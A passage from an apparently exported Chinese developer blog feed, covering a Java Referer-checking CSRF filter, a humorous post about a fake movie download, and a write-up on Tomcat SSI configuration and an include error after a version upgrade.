* if method not in POST|PUT|DELETE|CONNECT|PATCH, don't check</span></span><br><span class="line"><span class="comment">			 * referrer.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (!mathMethods.contains(method.trim().toUpperCase())) &#123;</span><br><span class="line">				filterChain.doFilter(request, response);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line"> </span><br><span class="line">			String referrer = request.getHeader(<span class="string">"referer"</span>);</span><br><span class="line"> </span><br><span class="line">			<span class="keyword">boolean</span> bAllow = <span class="keyword">false</span>;</span><br><span class="line">			<span class="keyword">if</span> (isBlank(referrer)) &#123;</span><br><span class="line">				bAllow = bAllowEmptyReferer;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				URL url = <span class="keyword">null</span>;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					url = <span class="keyword">new</span> URL(referrer);</span><br><span class="line">					String host = url.getHost();</span><br><span class="line">					<span class="keyword">if</span> (completeMatchHosts.contains(host)) &#123;</span><br><span class="line">						bAllow = <span class="keyword">true</span>;</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">for</span> (String domain : allowSubDomainHostList) &#123;</span><br><span class="line">							<span class="keyword">if</span> (host.endsWith(domain)) &#123;</span><br><span class="line">								bAllow = <span class="keyword">true</span>;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">					logger.error(<span class="string">"illegal referrer! referrer: "</span> + referrer, e);</span><br><span class="line">					bAllow = <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"> </span><br><span class="line">			<span class="keyword">if</span> (bAllow) &#123;</span><br><span class="line">				filterChain.doFilter(request, response);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (isBlank(redirectPath)) &#123;</span><br><span class="line">					response.sendError(HttpServletResponse.SC_FORBIDDEN);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					response.sendRedirect(request.getContextPath() + redirectPath);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBlank</span><span class="params">(CharSequence cs)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> strLen;</span><br><span class="line">		<span class="keyword">if</span> (cs == <span class="keyword">null</span> || (strLen = cs.length()) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strLen; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (Character.isWhitespace(cs.charAt(i)) == <span class="keyword">false</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">getBoolean</span><span class="params">(FilterConfig filterConfig, String parameter, <span class="keyword">boolean</span> defaultParameterValue)</span> </span>&#123;</span><br><span class="line">		String parameterString = filterConfig.getInitParameter(parameter);</span><br><span class="line">		<span class="keyword">if</span> (parameterString == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> defaultParameterValue;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> Boolean.parseBoolean(parameterString.trim());</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getInt</span><span class="params">(FilterConfig filterConfig, String parameter, <span class="keyword">int</span> defaultParameterValue)</span> </span>&#123;</span><br><span class="line">		String parameterString = filterConfig.getInitParameter(parameter);</span><br><span class="line">		<span class="keyword">if</span> (parameterString == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> defaultParameterValue;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> Integer.parseInt(parameterString.trim());</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * &lt;pre&gt;</span></span><br><span class="line"><span class="comment">	 * getSplitStringList(filterConfig, "hosts", "\\|", "test.com|abc.com");</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * if hosts is "hello.com|google.com", will return &#123;"hello.com", google.com"&#125;.</span></span><br><span class="line"><span class="comment">	 * if hosts is null, will return &#123;"test.com", "abc.com"&#125;</span></span><br><span class="line"><span class="comment">	 * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> filterConfig</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> parameter</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> regex</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> defaultParameterValue</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">getSplitStringList</span><span class="params">(FilterConfig filterConfig, String parameter, String regex, String defaultParameterValue)</span> </span>&#123;</span><br><span class="line">		String parameterString = filterConfig.getInitParameter(parameter);</span><br><span class="line">		<span class="keyword">if</span> (parameterString == <span class="keyword">null</span>) &#123;</span><br><span class="line">			parameterString = defaultParameterValue;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		String[] split = parameterString.split(<span class="string">"\\|"</span>);</span><br><span class="line">		<span class="keyword">if</span> (split != <span class="keyword">null</span>) &#123;</span><br><span class="line">			List&lt;String&gt; resultList = <span class="keyword">new</span> LinkedList&lt;String&gt;();</span><br><span class="line">			<span class="keyword">for</span> (String method : split) &#123;</span><br><span class="line">				resultList.add(method.trim());</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> resultList;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Set&lt;String&gt; <span class="title">getAllIPAndHost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		HashSet&lt;String&gt; resultSet = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line"> </span><br><span class="line">		Enumeration&lt;NetworkInterface&gt; interfaces;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			interfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">			<span class="keyword">while</span> (interfaces.hasMoreElements()) &#123;</span><br><span class="line">				NetworkInterface nic = interfaces.nextElement();</span><br><span class="line">				Enumeration&lt;InetAddress&gt; addresses = nic.getInetAddresses();</span><br><span class="line">				<span class="keyword">while</span> (addresses.hasMoreElements()) &#123;</span><br><span class="line">					InetAddress address = addresses.nextElement();</span><br><span class="line">					<span class="keyword">if</span> (address <span class="keyword">instanceof</span> Inet4Address) &#123;</span><br><span class="line">						resultSet.add(address.getHostAddress());</span><br><span class="line">						resultSet.add(address.getHostName());</span><br><span class="line">					&#125; <span class="keyword">else</span> <span class="keyword">if</span> (address <span class="keyword">instanceof</span> Inet6Address) &#123;</span><br><span class="line">						<span class="comment">// TODO how to process Inet6Address?</span></span><br><span class="line">						<span class="comment">// resultSet.add("[" + address.getHostAddress() + "]");</span></span><br><span class="line">						<span class="comment">// resultSet.add(address.getHostName());</span></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">			logger.error(<span class="string">"getAllIPAndHost error!"</span>, e);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> resultSet;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><p>在浏览器里如何访问IPV6的地址？</p>
<p>用”[]”把IPV6地址包围起来，比如localhost的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://[::1]</span><br></pre></td></tr></table></figure></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://superuser.com/questions/367780/how-to-connect-a-website-has-only-ipv6-address-without-domain-name" target="_blank" rel="noopener">http://superuser.com/questions/367780/how-to-connect-a-website-has-only-ipv6-address-without-domain-name</a></p>
<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms740593(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/ms740593(v=vs.85).aspx</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>csrf</tag>
        <tag>filter</tag>
        <tag>referer</tag>
      </tags>
  </entry>
  <entry>
    <title>一个假链接引发的血案</title>
    <url>/something-about-find-movie/</url>
    <content><![CDATA[<p>以前写的一个贴子，被豆瓣小编删掉了。翻出来，聊做纪念。</p>
<pre><code>一个假链接引发的血案  (2011-12-20 00:35)

某日找电影看，目标《晚秋》。
搜索 晚秋 ed2k，得到链接，1.42G，使用某工具离线下载完毕。
发现打不开，蛋疼。哥乃程序员，难到奈何不了你一小小文件。
于是用16进制方式打开，前面4个字节是CISO，搜索4349534F，发现原来是CSO格式
下载转换工具，转成ISO，虚拟光驱挂载，没有发现exe程序。
搜索“CSO”，原来是PSP镜像。
再下载PSP模拟器，加载镜像，前面能过去，后面进不去。卡在“now loading……”。
你这货也太缼德了，放个假链接也就算了，还放个不全的！
心中甚怒，决定出终极杀器。
截图，以图搜图，终于发现是djmax black square，类似劲舞团的游戏
下载个1.6G的ISO。
终于用模拟器打开，可以玩了。。一无聊的音乐游戏。

蛋疼之余，再次无聊。决心找到真正的《晚秋》。
再次用google搜索，韩文，英文结合，最后搜索，Late Autumn dvdrip
得到种子，下载。
得到一文件：
Late Autumn (Manchu) (2011) DVDRip XviD-MAX.rar
780 MB (818,395,866 字节)

双击，弹出一对话框：“输入密码”。
吐血，挣扎上床睡觉。
历时4小时+，今日记之，以警醒后人。
</code></pre>]]></content>
      <categories>
        <category>电影</category>
      </categories>
      <tags>
        <tag>电影</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat ssi配置及升级导致ssi include错误问题解决</title>
    <url>/tomcat-ssi-problem/</url>
    <content><![CDATA[<p>最近tomcat升级版本时，遇到了ssi解析的问题，记录下解决的过程，还有tomcat ssi配置的要点。</p>
<h2 id="tomcat-配置SSI的两种方式"><a href="#tomcat-配置SSI的两种方式" class="headerlink" title="tomcat 配置SSI的两种方式"></a>tomcat 配置SSI的两种方式</h2><p>Tomcat有两种方式支持SSI：Servlet和Filter。</p>
<h3 id="SSIServlet"><a href="#SSIServlet" class="headerlink" title="SSIServlet"></a>SSIServlet</h3><p>通过Servlet，org.apache.catalina.ssi.SSIServlet，默认处理”*.shtml”的URL。</p>
<p>配置方式：</p>
<p>修改tomcat的 conf/web.xml文件，去掉下面配置的注释：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ssi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      org.apache.catalina.ssi.SSIServlet</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>buffered<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>expires<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>666<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>isVirtualWebappRelative<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>4<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ssi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.shtml<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="SSIFilter"><a href="#SSIFilter" class="headerlink" title="SSIFilter"></a>SSIFilter</h3><p>通过Filter，org.apache.catalina.ssi.SSIFilter，默认处理”*.shtml”的URL。</p>
<p>配置方式：</p>
<p>修改tomcat的 conf/web.xml文件，打开去掉下面配置的注释：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ssi<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">      org.apache.catalina.ssi.SSIFilter</span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contentType<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>text/x-server-parsed-html(;.*)?<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>expires<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>666<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>isVirtualWebappRelative<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ssi<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.shtml<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>注意：两种配置方式最好不要同时打开，除非很清楚是怎样配置的。</strong></p>
<p>另外，在Tomcat的conf/context.xml里要配置privileged=”true”，否则有些SSI特性不能生效。<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">privileged</span>=<span class="string">"true"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="历史代码里处理SSI的办法"><a href="#历史代码里处理SSI的办法" class="headerlink" title="历史代码里处理SSI的办法"></a>历史代码里处理SSI的办法</h2><p>在公司的历史代码里，在一个公共的jar包里通过自定义一个EnhancedSSIServlet，继承了Tomcat的org.apache.catalina.ssi.SSIServlet来实现SSI功能的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet</span>(name=<span class="string">"ssi"</span>,</span><br><span class="line">            initParams=&#123;<span class="meta">@WebInitParam</span>(name=<span class="string">"buffered"</span>, value=<span class="string">"1"</span>), <span class="meta">@WebInitParam</span>(name=<span class="string">"debug"</span>, value=<span class="string">"0"</span>),</span><br><span class="line">                        <span class="meta">@WebInitParam</span>(name=<span class="string">"expires"</span>, value=<span class="string">"666"</span>), <span class="meta">@WebInitParam</span>(name=<span class="string">"isVirtualWebappRelative"</span>, value=<span class="string">"0"</span>),</span><br><span class="line">                        <span class="meta">@WebInitParam</span>(name=<span class="string">"inputEncoding"</span>, value=<span class="string">"UTF-8"</span>), <span class="meta">@WebInitParam</span>(name=<span class="string">"outputEncoding"</span>, value=<span class="string">"UTF-8"</span>) &#125;,</span><br><span class="line">            loadOnStartup=<span class="number">1</span>, urlPatterns=&#123;<span class="string">"*.shtml"</span>&#125;, asyncSupported=<span class="keyword">true</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EnhancedSSIServlet</span> <span class="keyword">extends</span> <span class="title">SSIServlet</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>其中<strong>@WebServlet</strong>是Servlet3.0规范里的，所以使用到web-common的web项目的web.xml文件都要配置为3.0版本以上，例如：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">version</span>=<span class="string">"3.0"</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>Tomcat是启动Web应用时，会扫描所有@WebServlet的类，并初始化。</strong></p>
<p>所以在使用到历史代码的项目都只能使用Tomcat服务器，并且不能在tomcat的conf/web.xml里打开SSI相关的配置。</p>
<h2 id="Tomcat版本升级的问题"><a href="#Tomcat版本升级的问题" class="headerlink" title="Tomcat版本升级的问题"></a>Tomcat版本升级的问题</h2><p>Tomcat版本从7.0.57升级到7.0.59过程中，出现了无法解析SSI include指令的错误：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SEVERE: #include--Couldn't include file: /pages/test/intelFilter.shtml</span><br><span class="line">java.io.IOException: Couldn<span class="string">'t get context for path: /pages/test/intelFilter.shtml</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIServletExternalResolver.getServletContextAndPathFromVirtualPath(SSIServletExternalResolver.java:422)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIServletExternalResolver.getServletContextAndPath(SSIServletExternalResolver.java:465)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIServletExternalResolver.getFileText(SSIServletExternalResolver.java:522)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIMediator.getFileText(SSIMediator.java:161)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIInclude.process(SSIInclude.java:50)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIProcessor.process(SSIProcessor.java:159)</span></span><br><span class="line"><span class="string">    at com.test.webcommon.servlet.EnhancedSSIServlet.processSSI(EnhancedSSIServlet.java:72)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIServlet.requestHandler(SSIServlet.java:181)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.ssi.SSIServlet.doPost(SSIServlet.java:137)</span></span><br><span class="line"><span class="string">    at javax.servlet.http.HttpServlet.service(HttpServlet.java:646)</span></span><br><span class="line"><span class="string">    at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:748)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:604)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:543)</span></span><br><span class="line"><span class="string">    at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:954)</span></span><br><span class="line"><span class="string">    at org.apache.jsp.pages.lottery.jczq.index_jsp._jspService(index_jsp.java:107)</span></span><br><span class="line"><span class="string">    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)</span></span><br><span class="line"><span class="string">    at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)</span></span><br><span class="line"><span class="string">    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)</span></span><br><span class="line"><span class="string">    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:395)</span></span><br><span class="line"><span class="string">    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:339)</span></span><br><span class="line"><span class="string">    at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)</span></span><br><span class="line"><span class="string">    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)</span></span><br></pre></td></tr></table></figure></p>
<p>仔细查看源代码后，发现不能处理的include指令代码如下：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include virtual="/pages/test/intelFilter.shtml"--&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>经过对比调试Tomcat的代码，发现是在7.0.58版本时，改变了处理URL的方法，关键的处理函数是<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.core.ApplicationContext.getContext( String uri)</span><br></pre></td></tr></table></figure></p>
<p>在7.0.57版本前，Tomcat在处理处理像/pages/test/intelFilter.shtml这样的路径时，恰好循环处理了”/“字符，使得childContext等于StandardContext，最终由StandardContext处理了/pages/test/intelFilter.shtml的请求。</p>
<p><strong>这个代码实际上是错误的，不过恰好处理了include virtual的情况。</strong></p>
<p><strong>在7.0.58版本修改了处理uri的代码，所以在升级Tomcat到7.0.59时出错了。</strong></p>
<p>7.0.57版的代码：<br><a href="https://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_57/java/org/apache/catalina/core/ApplicationContext.java" target="_blank" rel="noopener">https://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_57/java/org/apache/catalina/core/ApplicationContext.java</a><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return a &lt;code&gt;ServletContext&lt;/code&gt; object that corresponds to a</span></span><br><span class="line"><span class="comment"> * specified URI on the server.  This method allows servlets to gain</span></span><br><span class="line"><span class="comment"> * access to the context for various parts of the server, and as needed</span></span><br><span class="line"><span class="comment"> * obtain &lt;code&gt;RequestDispatcher&lt;/code&gt; objects or resources from the</span></span><br><span class="line"><span class="comment"> * context.  The given path must be absolute (beginning with a "/"),</span></span><br><span class="line"><span class="comment"> * and is interpreted based on our virtual host's document root.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uri Absolute URI of a resource on the server</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ServletContext <span class="title">getContext</span><span class="params">(String uri)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Validate the format of the specified argument</span></span><br><span class="line">    <span class="keyword">if</span> ((uri == <span class="keyword">null</span>) || (!uri.startsWith(<span class="string">"/"</span>)))</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">null</span>);</span><br><span class="line">    Context child = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Host host = (Host) context.getParent();</span><br><span class="line">        String mapuri = uri;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            child = (Context) host.findChild(mapuri);</span><br><span class="line">            <span class="keyword">if</span> (child != <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">int</span> slash = mapuri.lastIndexOf(<span class="string">'/'</span>);</span><br><span class="line">            <span class="keyword">if</span> (slash &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            mapuri = mapuri.substring(<span class="number">0</span>, slash);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        ExceptionUtils.handleThrowable(t);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (child == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (context.getCrossContext()) &#123;</span><br><span class="line">        <span class="comment">// If crossContext is enabled, can always return the context</span></span><br><span class="line">        <span class="keyword">return</span> child.getServletContext();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child == context) &#123;</span><br><span class="line">        <span class="comment">// Can still return the current context</span></span><br><span class="line">        <span class="keyword">return</span> context.getServletContext();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Nothing to return</span></span><br><span class="line">        <span class="keyword">return</span> (<span 